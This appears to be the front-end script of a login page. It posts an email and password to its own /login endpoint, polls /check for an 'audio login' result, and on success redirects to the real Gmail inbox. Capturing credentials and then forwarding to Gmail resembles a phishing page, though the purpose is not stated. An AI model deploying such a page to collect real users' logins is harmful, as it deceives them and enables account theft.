let keyboardLoginAttempted = false;

document.getElementById('loginForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    keyboardLoginAttempted = true;
    const password = document.getElementById('password').value;
    const messageEl = document.getElementById('message');

    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: document.getElementById('email').value.trim(),
                password: document.getElementById('password').value
            })
        });

        const result = await response.json();

        if (result.status === 'success') {
            messageEl.style.color = 'green';
            messageEl.innerText = 'Login successful! Redirecting...';
            setTimeout(() => {
                window.location.href = "https://mail.google.com/mail/u/0/";
            }, 1000);
        } else {
            messageEl.style.color = 'red';
            messageEl.innerText = result.message || 'Login failed';
        }
    } catch (error) {
        messageEl.style.color = 'red';
        messageEl.innerText = 'Error connecting to server';
        console.error('Login error:', error);
    }
});

async function checkAudioLogin() {
    if (keyboardLoginAttempted) return;

    try {
        const res = await fetch('/check');
        const status = await res.text();

        if (status === "success") {
            window.location.href = "https://mail.google.com/mail/u/0/";
        } else if (status === "failed") {
            showOverlay("Login cancelled", 3000);
        }
    } catch (error) {
        console.log("Server not ready yet...");
    }
}

function showOverlay(message, duration = 3000) {
    const overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.background = "rgba(0, 0, 0, 0.6)";
    overlay.style.display = "flex";
    overlay.style.alignItems = "center";
    overlay.style.justifyContent = "center";
    overlay.style.zIndex = "9999";

    const box = document.createElement("div");
    box.style.background = "white";
    box.style.padding = "20px 40px";
    box.style.borderRadius = "8px";
    box.style.fontSize = "18px";
    box.style.fontFamily = "sans-serif";
    box.style.color = "black";
    box.innerText = message;

    overlay.appendChild(box);
    document.body.appendChild(overlay);

    setTimeout(() => {
        overlay.remove();
        window.close();
    }, duration);
}

setInterval(checkAudioLogin, 1000);